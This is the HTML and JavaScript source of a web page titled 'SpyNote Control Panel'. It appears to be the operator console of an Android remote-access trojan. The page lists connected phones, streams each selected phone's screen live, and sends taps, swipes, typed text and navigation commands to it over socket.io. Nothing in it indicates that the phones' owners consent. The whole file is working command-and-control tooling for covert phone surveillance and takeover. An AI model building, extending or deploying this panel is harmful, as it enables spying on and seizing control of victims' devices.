<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated; image-rendering: -webkit-optimize-contrast;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; }
        
        /* ‚úÖ Control Panel - Type input REMOVED */
        #control-panel {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 15px;
            backdrop-filter: blur(10px); text-align: center;
        }
        button {
            padding: 10px 20px; margin: 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,123,255,0.4); }
        button:active { transform: translateY(0); }
        
        /* ‚úÖ Keyboard overlay for typing */
        #virtual-keyboard {
            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.95); padding: 15px; border-radius: 15px;
            backdrop-filter: blur(10px); display: none; max-width: 400px;
        }
        #type-input {
            width: 280px; padding: 12px; margin: 5px; border: none; 
            border-radius: 20px; background: #333; color: white; font-size: 16px;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <!-- ‚úÖ Virtual Keyboard (shows on double tap) -->
    <div id="virtual-keyboard">
        <input type="text" id="type-input" placeholder="Type here... (Enter to send)" maxlength="100">
        <br><button onclick="sendText()">‚úÖ Send Text</button>
        <button onclick="hideKeyboard()">‚ùå Cancel</button>
    </div>

    <div id="control-panel">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="toggleKeyboard()">‚å®Ô∏è Type</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let startX = 0, startY = 0, dragging = false;
        let tapCount = 0, lastTapTime = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const typeInput = document.getElementById('type-input');
        const virtualKeyboard = document.getElementById('virtual-keyboard');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ‚úÖ ULTRA SMOOTH SCREEN RENDERING - Fixed Black Screen
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                const img = new Image();
                img.onload = () => {
                    ctx.imageSmoothingEnabled = false;
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.onerror = () => console.error('Image load failed');
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand} ${info.version || ''}</small>
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // ‚úÖ DOUBLE TAP = Keyboard, SINGLE TAP = Click
        function handleTap(x, y) {
            const now = Date.now();
            if (now - lastTapTime < 300) {
                tapCount++;
                if (tapCount === 2) {
                    toggleKeyboard();
                    return;
                }
            } else {
                tapCount = 1;
            }
            lastTapTime = now;
            
            if (tapCount === 1) {
                sendTap(x, y);
            }
        }

        // Touch/Mouse Controls
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (dragging && currentDevice) {
                    const coords = getScaledCoords(
                        e.changedTouches?.[0]?.clientX || e.clientX,
                        e.changedTouches?.[0]?.clientY || e.clientY
                    );
                    handleTap(coords.x, coords.y);
                }
                dragging = false;
            });
        });

        function sendControl(action, x=0, y=0, startX=0, startY=0, endX=0, endY=0, text='') {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action, x, y, startX, startY, endX, endY, text 
            });
        }

        function sendTap(x, y) { sendControl('tap', x, y); }
        function sendSwipe(sx, sy, ex, ey) { sendControl('swipe', 0, 0, sx, sy, ex, ey); }
        function sendText() {
            const text = typeInput.value.trim();
            if (text) {
                sendControl('type', 0, 0, 0, 0, 0, 0, text);
                typeInput.value = '';
            }
        }
        function sendBack() { sendControl('back'); }
        function sendHome() { sendControl('home'); }
        
        function toggleKeyboard() {
            virtualKeyboard.style.display = virtualKeyboard.style.display === 'block' ? 'none' : 'block';
            if (virtualKeyboard.style.display === 'block') typeInput.focus();
        }
        function hideKeyboard() {
            virtualKeyboard.style.display = 'none';
            typeInput.value = '';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // ‚úÖ Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && virtualKeyboard.style.display === 'block') {
                sendText();
            }
            if (e.key === 'Escape') {
                hideKeyboard();
                if (currentDevice) sendBack();
            }
        });

        typeInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendText();
        });
    </script>
</body>
</html>
